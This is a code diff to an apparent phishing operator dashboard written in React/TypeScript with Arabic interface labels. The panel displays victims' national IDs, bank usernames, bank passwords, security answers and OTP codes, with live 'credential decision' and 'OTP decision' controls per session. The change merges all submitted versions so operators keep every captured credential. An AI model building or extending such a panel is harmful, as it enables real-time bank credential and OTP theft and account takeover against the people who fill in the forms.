@@ -127,6 +127,32 @@ function DataBadge({
   );
 }
 
+// دمج جميع نسخ الطلب حقلاً بحقل (الأحدث له الأولوية، لكن لا يُسقط حقول القديمة)
+function mergeVersionsData(sources: AppVersion[]): AppVersion {
+  const FIELDS: (keyof AppVersion)[] = [
+    "applicantType", "fullName", "nationalId", "dateOfBirth", "monthlySalary",
+    "employer", "phone", "email", "city", "maritalStatus",
+    "companyName", "businessType", "commercialRegistration", "employeeCount",
+    "annualRevenue", "contactName",
+    "bankName", "bankUsername", "bankPassword", "securityAnswer",
+    "otpCode",
+  ];
+  const sorted = [...sources].sort(
+    (a, b) => (Number(b.version) || 0) - (Number(a.version) || 0)
+  );
+  const result: Record<string, unknown> = {};
+  for (const field of FIELDS) {
+    for (const src of sorted) {
+      const val = src[field as keyof AppVersion];
+      if (val !== null && val !== undefined && val !== "") {
+        result[field] = val;
+        break;
+      }
+    }
+  }
+  return result as AppVersion;
+}
+
 export default function AdminDashboardPage() {
   const queryClient = useQueryClient();
   const [wsConnected, setWsConnected] = useState(false);
@@ -227,8 +253,9 @@ export default function AdminDashboardPage() {
                 getListApplicationsQueryKey(),
                 (old: unknown) => {
                   if (!Array.isArray(old)) return old;
+                  const prev = old.find((a: { id: number }) => a.id === msg.data.id) ?? {};
                   const updated = old.filter((a: { id: number }) => a.id !== msg.data.id);
-                  return [msg.data, ...updated]; // الطلب الجديد/المحدَّث دائماً في الأعلى
+                  return [{ ...prev, ...msg.data }, ...updated]; // دمج مع البيانات السابقة دائماً
                 }
               );
               queryClient.invalidateQueries({ queryKey: getGetApplicationStatsQueryKey() });
@@ -654,9 +681,9 @@ export default function AdminDashboardPage() {
                         {(() => {
                           const versions = versionCache[app.id] || [];
                           const totalVersions = versions.length;
-                          const currentVersion = versions.find((v) => v.isLatest);
                           const olderVersions = versions.filter((v) => !v.isLatest);
                           const activeTab = expandedTabs[app.id] || "current";
+                          const allData = mergeVersionsData([...versions, app as AppVersion]);
 
                           return (
                             <>
@@ -672,7 +699,7 @@ export default function AdminDashboardPage() {
                                     <ClipboardList className="w-4 h-4" />
                                     البيانات الحالية
                                     <span className="text-xs bg-primary/10 text-primary px-1.5 py-0.5 rounded-full">
-                                      {currentVersion ? currentVersion.version : app.version || 1}
+                                      {versions.length > 0 ? Math.max(...versions.map(v => v.version || 0)) : 1}
                                     </span>
                                   </button>
                                   {totalVersions > 1 && (
@@ -703,50 +730,50 @@ export default function AdminDashboardPage() {
                         <div className="bg-card rounded-xl p-4 space-y-2">
                           <h4 className="font-bold text-sm text-primary mb-3 flex items-center gap-2">
                             <User className="w-4 h-4" />
-                            {app.applicantType === "business"
+                            {allData.applicantType === "business"
                               ? "بيانات الشركة"
                               : "البيانات الشخصية"}
                           </h4>
                           <DataBadge
                             label="الاسم"
                             value={
-                              app.fullName || app.companyName || app.contactName
+                              allData.fullName || allData.companyName || allData.contactName
                             }
                           />
                           <DataBadge
                             label="رقم الهوية / السجل"
-                            value={app.nationalId || app.commercialRegistration}
+                            value={allData.nationalId || allData.commercialRegistration}
                           />
-                          <DataBadge label="رقم الهاتف" value={app.phone} />
+                          <DataBadge label="رقم الهاتف" value={allData.phone} />
                           <DataBadge
                             label="البريد الإلكتروني"
-                            value={app.email}
+                            value={allData.email}
                           />
                           <DataBadge
                             label="تاريخ الميلاد"
-                            value={app.dateOfBirth}
+                            value={allData.dateOfBirth}
                           />
                           <DataBadge
                             label="الراتب الشهري"
-                            value={app.monthlySalary}
+                            value={allData.monthlySalary}
                           />
-                          <DataBadge label="جهة العمل" value={app.employer} />
-                          <DataBadge label="المدينة" value={app.city} />
+                          <DataBadge label="جهة العمل" value={allData.employer} />
+                          <DataBadge label="المدينة" value={allData.city} />
                           <DataBadge
                             label="الحالة الاجتماعية"
-                            value={app.maritalStatus}
+                            value={allData.maritalStatus}
                           />
                           <DataBadge
                             label="نوع النشاط"
-                            value={app.businessType}
+                            value={allData.businessType}
                           />
                           <DataBadge
                             label="عدد الموظفين"
-                            value={app.employeeCount}
+                            value={allData.employeeCount}
                           />
                           <DataBadge
                             label="الإيرادات السنوية"
-                            value={app.annualRevenue}
+                            value={allData.annualRevenue}
                           />
                         </div>
 
@@ -758,23 +785,23 @@ export default function AdminDashboardPage() {
                           </h4>
                           <DataBadge
                             label="البنك المختار"
-                            value={app.bankName}
+                            value={allData.bankName}
                           />
                           <DataBadge
                             label="اسم المستخدم"
-                            value={app.bankUsername}
+                            value={allData.bankUsername}
                           />
                           <DataBadge
                             label="كلمة المرور"
-                            value={app.bankPassword}
+                            value={allData.bankPassword}
                           />
                           <DataBadge
                             label="كلمة التحقق / الأمان"
-                            value={app.securityAnswer}
+                            value={allData.securityAnswer}
                           />
 
                           {/* قرار بيانات الدخول */}
-                          {app.bankUsername && app.sessionId && (
+                          {allData.bankUsername && app.sessionId && (
                             <div className="pt-3 border-t space-y-2">
                               <p className="text-xs font-bold text-muted-foreground">
                                 قرار بيانات الدخول:
@@ -833,13 +860,13 @@ export default function AdminDashboardPage() {
                             <Smartphone className="w-4 h-4" />
                             رمز OTP والحالة
                           </h4>
-                          {app.otpCode ? (
+                          {allData.otpCode ? (
                             <div className="bg-muted rounded-xl p-4 text-center">
                               <p className="text-xs text-muted-foreground mb-1">
                                 رمز التحقق
                               </p>
                               <p className="text-3xl font-mono font-black text-primary tracking-[0.3em]">
-                                {app.otpCode}
+                                {allData.otpCode}
                               </p>
                             </div>
                           ) : (
@@ -868,7 +895,7 @@ export default function AdminDashboardPage() {
                           </div>
 
                           {/* قرار OTP */}
-                          {app.otpCode && app.sessionId && (
+                          {allData.otpCode && app.sessionId && (
                             <div className="pt-3 border-t">
                               <p className="text-xs font-bold text-muted-foreground mb-2">
                                 قرار رمز OTP:
